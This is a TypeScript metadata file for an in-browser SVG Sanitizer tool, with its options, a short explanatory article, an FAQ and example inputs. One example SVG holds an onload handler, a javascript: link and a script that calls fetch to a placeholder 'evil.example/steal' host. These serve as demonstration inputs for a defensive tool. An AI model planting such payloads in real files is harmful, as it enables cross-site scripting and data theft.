import type { ToolMeta } from '@/lib/types';

export const meta: ToolMeta = {
  id: 'svg-sanitizer',
  name: 'SVG Sanitizer',
  category: 'security',
  summary:
    'Strip scripts, event handlers and external references from an SVG, and report what changed.',
  description:
    'Paste or drop an SVG and get a hardened copy with active content removed: script elements, on* event handlers, javascript: URLs, foreignObject and embedded frames, unsafe CSS in style elements or attributes, XML processing instructions, the DOCTYPE and external or data: references. Every change is listed so you can review it, and audit mode reports the changes without producing a file.',
  keywords: [
    'svg sanitizer',
    'svg xss',
    'remove script from svg',
    'onload attribute',
    'foreignObject',
    'safe svg',
    'svg security',
    'untrusted svg',
  ],
  privacy: { processing: 'on-device', network: 'none', offline: true },
  input: 'file',
  accept: '.svg,image/svg+xml,text/xml,application/xml',
  acceptsText: true,
  options: [
    {
      key: 'action',
      label: 'Action',
      type: 'select',
      choices: [
        { value: 'clean', label: 'Clean and download' },
        { value: 'audit', label: 'Audit only (no file)' },
      ],
      default: 'clean',
    },
    {
      key: 'externalRefs',
      label: 'References outside the document',
      type: 'select',
      choices: [
        { value: 'strip', label: 'Remove them' },
        { value: 'keep', label: 'Keep them' },
      ],
      default: 'strip',
    },
    {
      key: 'stripComments',
      label: 'Remove comments',
      type: 'boolean',
      default: true,
    },
  ],
  examples: [
    {
      title: 'An SVG with a script and an event handler',
      input:
        '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="120" onload="alert(1)">\n  <script>fetch("https://evil.example/steal")</script>\n  <circle cx="60" cy="60" r="50" fill="#0af"/>\n  <a href="javascript:alert(2)"><text x="10" y="110">click</text></a>\n</svg>',
    },
    {
      title: 'Audit an SVG without exporting a file',
      input:
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><rect width="10" height="10"/></svg>',
      options: { action: 'audit' },
    },
    {
      title: 'Keep external references and comments',
      input:
        '<svg xmlns="http://www.w3.org/2000/svg"><!-- note --><image href="https://example.com/a.png" width="10" height="10"/></svg>',
      options: { externalRefs: 'keep', stripComments: false },
    },
  ],
  article: [
    {
      heading: 'What the cleaner removes',
      body: 'Feed it SVG markup or a dropped .svg file and it strips script elements, on event handler attributes, javascript and vbscript URLs, foreignObject, embedded frames, XML processing instructions, the DOCTYPE and unsafe stylesheet content. You get a hardened copy plus a list naming every element or attribute it changed.',
    },
    {
      heading: 'Audit versus clean',
      body: 'Action decides the outcome: Clean and download writes the sanitised file, while Audit only lists the findings and hands back no file, which suits reviewing an asset before committing it. Removing comments is on by default, since comments never render and can hide payloads.',
    },
    {
      heading: 'External references',
      body: 'By default references outside the document go: absolute and relative URLs, protocol-relative links and SVG or HTML data URIs. Same-document fragments such as a gradient id and raster data images survive. Switch the option to Keep and the report warns that opening the file may still trigger network requests.',
    },
    {
      heading: 'Limits and privacy',
      body: 'Only well-formed SVG parses, the root must be svg, and inputs over 10 MB are refused. This is a hardening filter, not a sandbox, so keep treating the output as untrusted. Parsing and rewriting happen locally in your browser and nothing is uploaded.',
    },
  ],
  faq: [
    {
      q: 'Is the result safe to embed?',
      a: 'It is much safer, but this is a denylist filter rather than a sandbox: it removes the constructs that are known to execute or fetch, and it cannot prove that an SVG renderer will never find another way. Keep treating output from untrusted sources as untrusted, and serve it from a separate origin where you can.',
    },
    {
      q: 'What counts as a reference outside the document?',
      a: 'Anything that is not a same-document fragment such as #gradient or a raster data: image. That means absolute and relative URLs, protocol-relative URLs, and SVG or HTML data: URIs, because fetching them can leak the reader\u2019s IP address and loading them can execute code.',
    },
    {
      q: 'Why remove foreignObject and animation elements?',
      a: 'foreignObject can carry arbitrary HTML including scripts, and the SVG 1.2 handler, listener and animation elements, plus set or animate targeting an href, can install scripted behaviour. Legitimate illustrations rarely need them, and geometric animations that do not touch hrefs are kept.',
    },
    {
      q: 'Will it break my drawing?',
      a: 'Paths, shapes, groups, gradients, filters, text and internal references are left untouched, including formatting and attribute order. If a change would affect the artwork, the report names the element or attribute so you can decide whether to accept it.',
    },
  ],
  related: ['svg-optimizer', 'svg-to-png', 'security-headers', 'html-validator'],
  status: 'stable',
};
